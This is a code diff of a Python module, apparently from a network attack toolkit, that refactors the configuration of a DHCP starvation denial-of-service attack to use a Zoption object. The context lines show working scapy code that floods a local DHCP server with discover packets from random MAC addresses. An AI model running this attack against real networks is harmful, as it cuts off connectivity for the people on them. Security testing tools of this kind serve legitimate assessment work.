@@ -2,6 +2,7 @@ from scapy.all import *
 from util import Msg
 from dos import DoS
 from threading import Thread
+from zoption import Zoption
 
 """DHCP starvation attack involves firing off DHCP request packets with random
    MAC addresses.  With this we can exhaust the address space reserved by the
@@ -16,10 +17,10 @@ class dhcp_starvation(DoS):
         super(dhcp_starvation, self).__init__('DHCP Starvation')
         conf.verb = 0
         self.config.pop("target", None)
-        self.config.update({"interval":{"type":"int", 
-                                        "value":0.1,
-                                        "required":False, 
-                                "display":"Interval to send advertisements"}
+        self.config.update({"interval":Zoption(type = "int", 
+                                               value = 0.1,
+                                               required = False, 
+                                display = "Interval to send advertisements")
                            })
         self.info = """
                     Cause a denial of service against a local DHCP server.
@@ -44,4 +45,4 @@ class dhcp_starvation(DoS):
             pkt /= BOOTP(chaddr=RandString(12, '0123456789abcdef'))
             pkt /= DHCP(options=[("message-type", 'discover'), 'end'])
             sendp(pkt)
-            sleep(self.config['interval']['value'])
+            sleep(self.config['interval'].value)
